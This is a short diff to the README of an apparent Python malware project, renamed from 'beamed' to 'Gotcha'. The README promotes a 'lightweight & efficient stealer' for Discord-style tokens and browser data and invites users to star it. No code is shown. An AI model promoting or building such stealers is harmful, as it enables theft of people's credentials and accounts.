@@ -13,9 +13,9 @@ Gotcha! or Formally Known as "Beamed" is an active updation fork of l-ust/beamed
 
 
 
-## "beamed": tokensteal, browsersteal, & more:
+## "Gotcha": tokensteal, browsersteal, & more:
 
-with only 293 lines of code, i've developed a lightweight & efficient stealer in Python.
+with only 400 lines of code, i've developed a lightweight & efficient stealer in Python.
 
 if you end up using this; pass a star/follow:
 
